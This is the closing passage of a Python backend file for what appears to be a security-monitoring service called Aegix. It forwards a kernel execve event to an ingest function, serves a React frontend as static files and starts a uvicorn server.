    # Detection runs inside ingest_security_event.
    await ingest_security_event(execve_event, source="kernel")


# ==============================================================================
# Static Files (Frontend)
# ==============================================================================

# Serve React frontend build as static files.
# Mount at the very end so API routes take precedence.
frontend_dist = os.path.join(PROJECT_ROOT, "frontend", "dist")
if os.path.exists(frontend_dist):
    app.mount("/", StaticFiles(directory=frontend_dist, html=True), name="frontend")
else:
    logger.warning(
        f"Frontend dist directory not found at {frontend_dist}. Frontend assets will not be served."
    )


# ==============================================================================
# Main Entry Point
# ==============================================================================

if __name__ == "__main__":
    import uvicorn

    logger.info("Starting Aegix backend server")
    logger.info(f"API: http://{settings.api_host}:{settings.api_port}")
    logger.info(f"Docs: http://{settings.api_host}:{settings.api_port}/docs")
    logger.info(f"WebSocket: ws://{settings.api_host}:{settings.api_port}/ws")

    uvicorn.run(
        app,
        host=settings.api_host,
        port=settings.api_port,
        log_level=settings.api_log_level,
    )
